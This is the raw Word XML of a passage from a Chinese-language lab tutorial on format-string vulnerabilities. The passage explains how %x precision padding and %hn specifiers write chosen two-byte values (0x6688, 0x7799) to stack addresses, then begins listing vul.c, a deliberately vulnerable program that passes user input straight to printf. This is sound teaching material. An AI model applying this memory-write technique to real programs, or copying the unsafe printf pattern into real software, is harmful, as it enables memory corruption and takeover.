        <w:t>4(12+4*8)</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字符。为了达到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x6688</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，也就是十进制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>6248</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，需要再打印</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>6204</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字符。这就是设置最后一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的精度为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.26204x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的缘故。当到达第一个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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x6688</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将会被写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff306</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>地址处的两个字节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74718C51" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>完成第一个地址内存的修改后，如果立即使用另一个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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>来修改第二个地址内存，相同的值会被写入第二个地址。因此需要输出更多字符以增加到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x7799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。这就是为什么要在两个地址之间放入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字符串</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@@@@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，这样一来就能在两个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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>之间插入一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>来输出更多的字符。第一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>之后，</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>a_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>指针指向</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@@@@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(0x40404040)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将输出它，接着移动指针到第二个地址。通过设置精度为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>369(0x7799-0x6688)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，再输出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>369</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字符。因此，当到达第二个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>hn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>7799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将会被写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff30</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>地址处的两个字节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4320FA88"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源代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63381E07" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以下</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>vul</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>为含有格式化字符串漏洞的代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE4DE96" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251667456" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="66EEB248" wp14:editId="6E3A56D6">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1452245</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>16510</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="3220085"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="13970"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="25" name="文本框 25"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="3220085"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="2A8ACAA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298D714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w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="323EF63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input[</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>100</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>];</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3477DAB8"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var=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>0x11223344</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="750E96A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/*print out information for experiment purpose*/</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4BB6DF1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"Target address: %x\n"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&amp;var);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4199150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"Data at target address: 0x%x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, var);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="28C96732" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="5188A9F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"Please enter a string: "</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="02EDBA3C"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fgets</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/>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000FF"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>sizeof</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd"/>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,stdin);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="750E3E2D"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08000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>//The vulnerable place</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3E742EE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"Data at target address: 0x%x\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>,var</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0A38035A"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w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="21E5465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73C8961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w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="71325D9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343E8D61" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="5EC29C60" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="66EEB248" id="文本框 25" o:spid="_x0000_s1032" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:114.35pt;margin-top:1.3pt;width:392.9pt;height:253.55pt;z-index:-25164902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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="2A8ACAA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298D714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w:t>
                      </w:r>
                    </w:p>
